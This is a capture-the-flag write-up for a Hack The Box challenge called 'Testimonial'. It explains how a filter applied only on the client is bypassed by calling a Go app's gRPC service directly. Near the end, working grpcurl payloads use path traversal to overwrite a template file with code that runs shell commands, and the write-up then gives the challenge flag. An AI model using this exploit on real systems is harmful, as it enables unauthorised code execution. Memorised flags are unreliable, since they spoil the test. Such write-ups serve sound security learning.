## Title

Testimonial

## Description

As the leader of the Revivalists you are determined to take down the KORP, you and the best of your faction's hackers have set out to deface the official KORP website to send them a message that the revolution is closing in.

## Solution

By looking at the files it seems like a go web app. It is using two different ports, **1337** and **50045**(build-docker.sh).

Besides that, it uses two packages, `github.com/cosmtrek/air@latest` and `github.com/a-h/templ/cmd/templ@latest`(Dockerfile).

The version of `go` is `1.21.1`(go.mod).

In main.go we know that the port 1337 is running a web app and on port 50045 we have a GRPC service.
GRPC is a modern RPC that holds services, in this case `RegisterRickyServiceServer` which holds functions.
Inside grpc.go we have a RPC function called `SubmitTestimonial` which submits testimonials to a directory that can be accessible using the web app called `public/testimonials`. If we are able to write a web shell maybe we can access it via testimonials.

Looking at the testimonials directory we found three .txt files:
- 1.txt: `The Phreaks' cunning strategies have been a game-changer. They're not just telecom experts; they are masterminds.`
- 2.txt: `The Revivalists' commitment to a natural way of life is inspiring. They bring a fresh perspective to The Fray.`
- 3.txt: `The Profits' focus on wealth and salvation is unmatched. They understand the value of success in The Fray.`

The function is expecting two parameters: `Customer` and `Testimonial`.
In client.go we found the filter that is used in this challenge when submitting testimonials:

```go
func (c *Client) SendTestimonial(customer, testimonial string) error {
	ctx := context.Background()
	// Filter bad characters.
	for _, char := range []string{"/", "\\", ":", "*", "?", "\"", "<", ">", "|", "."} {
		customer = strings.ReplaceAll(customer, char, "")
	}

	_, err := c.SubmitTestimonial(ctx, &pb.TestimonialSubmission{Customer: customer, Testimonial: testimonial})
	return err
}
```

In handler/home.go we found the way to send testimonials:

```go
func HandleHomeIndex(w http.ResponseWriter, r *http.Request) error {
	customer := r.URL.Query().Get("customer")
	testimonial := r.URL.Query().Get("testimonial")
	if customer != "" && testimonial != "" {
		c, err := client.GetClient()
		if err != nil {
			http.Error(w, err.Error(), http.StatusInternalServerError)

		}

		if err := c.SendTestimonial(customer, testimonial); err != nil {
			http.Error(w, err.Error(), http.StatusInternalServerError)

		}
	}
	return home.Index().Render(r.Context(), w)
}
```

In pb/ptypes_grpc.pb.go we found the actual GRPC service name:

```go
func (c *rickyServiceClient) SubmitTestimonial(ctx context.Context, in *TestimonialSubmission, opts ...grpc.CallOption) (*GenericReply, error) {
	out := new(GenericReply)
	err := c.cc.Invoke(ctx, "/RickyService/SubmitTestimonial", in, out, opts...)
	if err != nil {
		return nil, err
	}
	return out, nil
}
```

Note: We can see the same information at pb/ptypes.proto.
Before we can try to bypass the filter in order to deploy a web shell, we can try to send a request directly to the GRPC without using the web app.
An interface we can use [is](https://github.com/fullstorydev/grpcui).

```
$ ~/go/bin/grpcui -plaintext 83.136.252.194:59124 
Failed to compute set of methods to expose: server does not support the reflection API
```

```
~/go/bin/grpcui -use-reflection=false -proto=./web/testimonial/challenge/pb/ptypes.proto -plaintext 83.136.252.194:59124\
```

When submitting a file, it appears in the web app but when going to the `public/testimonials` endpoint we only have the three .txt files.
It must be saving the files at another location. I tried to save a file at another location by using the costumer name `../../../challenge/public` but can't save files.

In grpc.go:

```go
func (s *server) SubmitTestimonial(ctx context.Context, req *pb.TestimonialSubmission) (*pb.GenericReply, error) {
	if req.Customer == "" {
		return nil, errors.New("Name is required")
	}
	if req.Testimonial == "" {
		return nil, errors.New("Content is required")
	}

	err := os.WriteFile(fmt.Sprintf("public/testimonials/%s", req.Customer), []byte(req.Testimonial), 0644)
	if err != nil {
		return nil, err
	}

	return &pb.GenericReply{Message: "Testimonial submitted successfully"}, nil
}

```

In index.templ:

```javascript
func GetTestimonials() []string {
	fsys := os.DirFS("public/testimonials")	
	files, err := fs.ReadDir(fsys, ".")		
	if err != nil {
		return []string{fmt.Sprintf("Error reading testimonials: %v", err)}
	}
	var res []string
	for _, file := range files {
		fileContent, _ := fs.ReadFile(fsys, file.Name())
		res = append(res, string(fileContent))		
	}
	return res
}

```

In order to obtain RCE we overwrite the index.templ, lets test with a ls command :
(Note: we will use grpcurl)

```shell
./grpcurl -plaintext -d '{"customer": "../../view/home/index.templ", "testimonial": "package home\n\nimport (\n\t\"os/exec\"\n\t\"strings\"\n)\n\nfunc hack() []string {\n\toutput, _ := exec.Command(\"ls\", \"/\").CombinedOutput()\n\tlines := strings.Fields(string(output))\n\treturn lines\n}\n\ntempl Index() {\n\t@template(hack())\n}\n\ntempl template(items []string) {\n\tfor _, item := range items {\n\t\t{item}\n\t}\n}" }' -import-path challenge/pb/ -proto ptypes.proto 127.0.0.1:50045 RickyService.SubmitTestimonial
```
It worked, lets look for the flag:

```shell
./grpcurl -plaintext -d '{"customer": "../../view/home/index.templ", "testimonial": "package home\n\nimport (\n\t\"os/exec\"\n\t\"strings\"\n)\n\nfunc hack() []string {\n\toutput, _ := exec.Command(\"cat\", \"/flagbba4cb647c.txt\").CombinedOutput()\n\tlines := strings.Fields(string(output))\n\treturn lines\n}\n\ntempl Index() {\n\t@template(hack())\n}\n\ntempl template(items []string) {\n\tfor _, item := range items {\n\t\t{item}\n\t}\n}" }' -import-path challenge/pb/ -proto ptypes.proto 127.0.0.1:50045 RickyService.SubmitTestimonial
```

Flag: `HTB{w34kly_t35t3d_t3mplate5}`